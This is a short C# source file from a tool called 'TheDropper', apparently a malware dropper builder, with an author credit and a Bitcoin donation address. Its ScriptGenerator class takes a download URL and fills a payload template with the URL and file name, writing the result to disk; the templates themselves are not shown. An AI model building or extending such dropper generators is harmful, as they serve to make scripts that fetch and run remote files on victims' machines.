/*
    $ TheDropper $

    ^ Author github.com/L1ghtM4n
    ^ Donate 1Lightx1nLy6DfH3W8WD1g4PugRu92M7GV (BTC)
*/

using System;
using System.IO;

namespace TheDropper.Generators
{
    internal class ScriptGenerator
    {
        public static string fileUrl { get; private set; }
        public static string fileName { get; private set; }

        public ScriptGenerator(string url)
        {
            Uri uri = new Uri(url);
            fileUrl = uri.AbsoluteUri;
            fileName = Path.GetFileName(uri.LocalPath);
        }

        /// <summary>
        /// Generate payload
        /// </summary>
        /// <param name="payloadContent">Payload text</param>
        /// <param name="outExtension">Output payload extension</param>
        /// <returns>Payload path on disk</returns>
        public string Generate(string payloadContent, string outExtension)
        {
            string payloadFile = Path.Combine(Directory.GetCurrentDirectory(), $"output.{outExtension}");
            string payloadData = string.Format(payloadContent, fileName, fileUrl);
            File.WriteAllText(payloadFile, payloadData);
            return payloadFile;
        }
        
    }
}
